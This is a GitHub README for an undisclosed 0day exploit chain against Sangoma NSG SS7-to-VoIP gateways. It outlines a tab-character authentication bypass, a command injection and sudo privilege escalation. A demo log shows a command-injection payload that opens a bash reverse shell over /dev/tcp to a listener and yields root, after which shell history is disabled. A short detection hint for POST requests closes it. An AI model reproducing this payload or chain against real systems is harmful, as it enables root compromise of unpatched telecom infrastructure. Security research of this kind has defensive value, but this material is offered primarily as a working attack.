# tabbypass-nsg-exploits
"Tab Bypass" Exploits for Sangoma NSG

This proof of concept exploit abuses three chained vulnerabilities to reliably spawn a root-shell on Sangoma NSG (Netborder SS7 to VoIP Gateway) systems. These are found in telco-land and supposedly provide a "security" function. 

Bug 1: "Tab Bypass" argument injection trickery enabling authentication bypass as an admin user in the web interface (affects NSC and NSG).  
Bug 2: Shell command injection in TODO  
Bug 3: One of many local privesc bugs caused by a comically insecure sudoers config that land us a root shell. In this case, we use sudo access to "nohup".  

Bug 3 can be swapped for any of several LPE exploits, this one just goes for a quick and easy win to launch a bash reverse shell as a proof of concept. More sophisticated exploits will be released eventually. 

This exploit is a proof of concept that demonstrates chaining these issues. A similar exploit for the NSC product is available in the [tabbypass-nsc-exploits](https://github.com/fullspectrumdev/tabbypass-nsc-exploits) repository. 

## Demo:  
```
% python3 tabbypass-nsg.py http://192.168.0.98 192.168.0.55 1337
[+] Attempting to bypass authentication...
[*] Auth bypass succeeded, we can proceed...
[*] Using 192.168.0.55:1337 for connectback...
[+] starting handler on port 1337
[+] Doing the command injection...
.*$(sudo nohup bash -i >& /dev/tcp/192.168.0.55/1337 0>&1 &)
[*] Got connection from 192.168.0.98
[$] Shell popped :P
bash: no job control in this shell
[root@nsg admin]# unset HISTFILE
unset HISTFILE
[root@nsg admin]# id;uname -a
id;uname -a
uid=0(root) gid=0(root) groups=0(root)
Linux nsg.sangoma.local 2.6.32-431.5.1.el6.x86_64 #1 SMP Tue Feb 25 14:12:47 BRT 2014 x86_64 x86_64 x86_64 GNU/Linux
[root@nsg admin]# pwd
pwd
/var/webconfig/htdocs/admin
[root@nsg admin]# 
```


## Disclosure timeline:  
None. This is 0day dropped at BSides Basingstoke 2024.

## Detection: 
Still need to get around to writing a Snort or Suricata rule for this. However.  
POST requests to /index.php containing the POST variable "reserved_username" and a tab character in that post variable should detect it. 
